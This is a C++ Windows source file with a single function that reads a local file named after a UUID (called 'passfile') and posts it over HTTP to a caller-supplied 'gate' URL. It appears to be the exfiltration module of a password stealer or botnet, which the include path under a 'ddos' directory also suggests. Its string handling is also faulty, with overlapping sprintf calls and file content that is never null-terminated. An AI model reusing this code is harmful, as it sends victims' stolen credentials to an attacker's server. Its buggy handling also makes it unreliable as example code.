#include <iostream>
#include <shlwapi.h>
#include <wininet.h>
#include <string>
#include "../../ddos/dlltest/URL.h"
#pragma warning(disable:4996)

using namespace std;

#pragma comment (lib, "WinInet.lib")




std::string postRequest(std::string uuid, std::string gate)
{
	std::string passfile = uuid + ".txt";
	

	char* host;
	char* path;
	HTTPURL u(gate);


	host = (char*)u.domain.c_str();
	path = (char*)u.path.c_str();
	
	// Local variables
	static char* filename = (char*)passfile.c_str();   //Filename to be loaded
	static char* type = (char*) "text/plain";
	static char boundary[] = "pippo";            //Header boundary
	static char nameForm[] = "media";     //Input form name

	char hdrs[255];                  //Headers
	char* buffer;                   //Buffer containing file + headers
	char* content;                  //Buffer containing file
	FILE* pFile;                    //File pointer
	long lSize;                      //File size
	size_t result;


	// Open file
	pFile = fopen(filename, "rb");
	if (pFile == NULL) return "";

	// obtain file size:
	fseek(pFile, 0, SEEK_END);
	lSize = ftell(pFile);
	rewind(pFile);

	// allocate memory to contain the whole file:
	content = (char*)malloc(sizeof(char) * lSize);
	if (content == NULL) return "";

	// copy the file into the buffer:
	result = fread(content, 1, lSize, pFile);
	if (result != lSize) return "";

	// terminate
	fclose(pFile);

	//allocate memory to contain the whole file + HEADER
	buffer = (char*)malloc(sizeof(char) * lSize + 2048);

	//print header
	sprintf(hdrs, "Content-Type: multipart/form-data; boundary=%s", boundary);
	sprintf(buffer, "--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\r\n", boundary, nameForm, filename);
	sprintf(buffer, "%sContent-Type: %s\r\n\r\n", buffer, type);
	sprintf(buffer, "%s%s\r\n", buffer, content);
	sprintf(buffer, "%s--%s--\r\n", buffer, boundary);

	//Open internet connection
	HINTERNET hSession = InternetOpen("WinSock", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hSession == NULL) return "";

	HINTERNET hConnect = InternetConnect(hSession, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	if (hConnect == NULL) return "";

	HINTERNET hRequest = HttpOpenRequest(hConnect, (const char*)"POST", path, NULL, NULL, (const char**)"*/*\0", 0, 1);
	if (hRequest == NULL) return "";

	BOOL sent = HttpSendRequest(hRequest, hdrs, strlen(hdrs), buffer, strlen(buffer));
	if (!sent) return "";

	//close any valid internet-handles
	InternetCloseHandle(hSession);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hRequest);

	return "";
}
